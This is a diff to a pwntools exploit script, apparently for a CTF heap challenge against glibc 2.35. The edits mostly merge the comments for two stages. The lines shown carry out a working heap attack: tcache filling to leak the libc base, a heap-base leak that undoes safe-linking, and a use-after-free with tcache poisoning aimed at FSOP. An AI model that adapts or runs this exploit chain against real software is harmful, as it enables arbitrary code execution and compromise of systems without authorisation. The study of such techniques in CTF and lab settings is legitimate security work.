@@ -29,7 +29,7 @@ def write(index, data):
     p.sendlineafter(b"index: ", str(index).encode())
     p.sendlineafter(b"write something in: ", data)
 
-# Stage 1: leak glibc base address
+# Stage 1: leak glibc base address and heap base address
 # allocate 9 chunks, the last one is to avoid malloc_consolidate
 for i in range(9):
     malloc(i, 0xf8)
@@ -38,12 +38,10 @@ for i in range(8):
     free(i)
 glibc_base_addr = u64(view(7).ljust(8, b'\x00'))-0x21ace0
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
-
-# Stage 2: leak heap base address
 heap_base_addr = ((u64(view(0).ljust(8, b'\x00'))<<12)^0)&~0xfff
 log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 3: tcache poisoning to trigger FSOP
+# Stage 2: tcache poisoning to trigger FSOP
 glibc_e = ELF('./libc-2.35.so')
 malloc(10, 0xf8)
 # chunk in position 6 and 10 are the same, UAF available
